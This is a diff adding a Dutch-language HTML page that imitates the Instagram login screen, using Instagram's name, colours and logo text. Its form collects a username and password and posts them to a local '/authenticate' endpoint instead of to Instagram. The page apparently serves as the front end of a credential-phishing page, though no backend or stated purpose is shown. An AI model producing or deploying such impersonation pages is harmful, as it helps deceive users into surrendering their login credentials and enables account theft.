@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inloggen bij Instagram</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4); /* Instagram gradient */
+      background-size: 400% 400%; /* Zachte overgang */
+      animation: gradientBG 8s ease infinite;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      text-align: center;
+      background-color: white;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 350px;
+    }
+
+    /* Instagram-logo (simpele tekstversie) */
+    .logo {
+      font-family: 'Courier New', Courier, monospace; /* Speciaal font */
+      font-size: 32px;
+      font-weight: bold;
+      color: #bc2a8d; /* Magenta */
+      margin-bottom: 30px;
+      background: -webkit-linear-gradient(#f58529, #dd2a7b, #8134af, #515bd4); /* Instagram-gradient */
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 14px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      background-color: #fafafa;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #a29bfe; /* Paarse focus */
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      background-color: #3897f0; /* Instagram blauw */
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #287dcf; /* Donkerder blauw */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Instagram-logo -->
+    <div class="logo">Instagram</div>
+
+    <h2>Log in om door te gaan</h2>
+    <form action="/authenticate" method="POST">
+      <input type="text" name="username" placeholder="Gebruikersnaam of e-mailadres" required>
+      <input type="password" name="password" placeholder="Wachtwoord" required>
+      <button type="submit">Inloggen</button>
+    </form>
+  </div>
+
+</body>
+</html>
